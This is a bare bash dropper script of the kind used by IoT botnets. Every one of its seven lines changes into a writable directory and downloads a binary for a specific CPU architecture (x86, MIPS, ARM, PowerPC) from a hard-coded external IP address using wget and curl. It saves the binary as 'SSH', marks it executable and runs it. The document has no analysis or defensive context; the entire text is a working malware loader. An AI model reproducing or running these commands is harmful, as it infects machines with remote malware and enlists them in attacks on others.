#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/fuckyou/xd.x86; curl -O http://45.155.165.86/fuckyou/xd.x86;cat xd.x86 >SSH;chmod +x *;./SSH
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/fuckyou/xd.mips; curl -O http://45.155.165.86/fuckyou/xd.mips;cat xd.mips >SSH;chmod +x *;./SSH
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/fuckyou/xd.mpsl; curl -O http://45.155.165.86/fuckyou/xd.mpsl;cat xd.mpsl >SSH;chmod +x *;./SSH
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/fuckyou/xd.arm5; curl -O http://45.155.165.86/fuckyou/xd.arm5;cat xd.arm5 >SSH;chmod +x *;./SSH
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/fuckyou/xd.arm6; curl -O http://45.155.165.86/fuckyou/xd.arm6;cat xd.arm6 >SSH;chmod +x *;./SSH
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/fuckyou/xd.arm7; curl -O http://45.155.165.86/fuckyou/xd.arm7;cat xd.arm7 >SSH;chmod +x *;./SSH
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/fuckyou/xd.ppc; curl -O http://45.155.165.86/fuckyou/xd.ppc;cat xd.ppc >SSH;chmod +x *;./SSH
